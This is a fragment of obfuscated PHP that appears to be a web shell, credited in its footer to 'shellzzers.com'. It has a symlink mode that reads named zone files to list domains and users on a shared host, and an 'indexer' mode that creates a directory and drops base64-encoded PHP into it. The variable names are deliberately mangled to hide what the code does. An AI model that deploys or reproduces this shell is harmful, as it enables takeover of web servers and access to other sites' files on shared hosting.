...
<td>' . $IIIIIIII1lII . '</td></tr>';
        ...
        case 'sym':
            ...
            if (!$IIIIIIIIIl1I) {
                ...
                echo "<img
src=><div class='tmp'><table align='center' width='40%'><td>Domains</td><td>Users</td><td>symlink </td><td>Pagerank</td>";
                foreach ($IIIIIIIIIl1I as $IIIIIIIIIl11) {
                    if (eregi('zone', $IIIIIIIIIl11)) {
                        preg_match_all('#zone "(.*)"#', $IIIIIIIIIl11, $IIIIIIIII1I1);
                        flush();
...
JG51bS4nIj5zeW1saW5rJy4kbnVtLic8L2E+IGZpbGU8L0ZPTlQ+Jyk7'));
        ...
        case 'indexer':
            mkdir('indexer', 0755);
            chdir('indexer');
            $IIIIIIIlllII = 'PHAgYWxpZ249InJpZ2h0Ij48L3A+PGJvZHkgYmdjb2xvcj0iI0ZGRkZGRiI+IAo8P3BocCAKCiMj
...
'));
    ...
    echo '
<br /><br /><div class="fot">Coded by shellzzers.com
<br /><br />
 ';
};
echo '
